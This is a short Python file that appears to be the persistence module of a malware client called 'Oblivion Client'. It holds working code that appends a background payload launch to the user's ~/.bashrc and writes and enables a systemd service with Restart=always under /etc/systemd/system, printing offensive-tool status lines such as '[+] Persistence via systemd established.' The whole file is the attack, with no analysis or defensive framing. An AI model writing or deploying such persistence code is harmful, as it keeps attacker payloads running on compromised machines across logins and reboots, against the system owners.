import os

def persist_bashrc(payload_path):
    bashrc = os.path.expanduser("~/.bashrc")
    line = f"python3 {payload_path} &\n"
    with open(bashrc, "a") as f:
        f.write(line)
    print("[+] Persistence via .bashrc established.")

def persist_systemd(payload_path):
    service_name = "oblivionclient.service"
    service_file = f"""[Unit]
Description=Oblivion Client

[Service]
ExecStart=/usr/bin/python3 {payload_path}
Restart=always
User={os.getenv("USER")}

[Install]
WantedBy=multi-user.target"""
    systemd_path = f"/etc/systemd/system/{service_name}"
    with open(systemd_path, "w") as f:
        f.write(service_file)
    os.system(f"systemctl enable {service_name}")
    print("[+] Persistence via systemd established.")
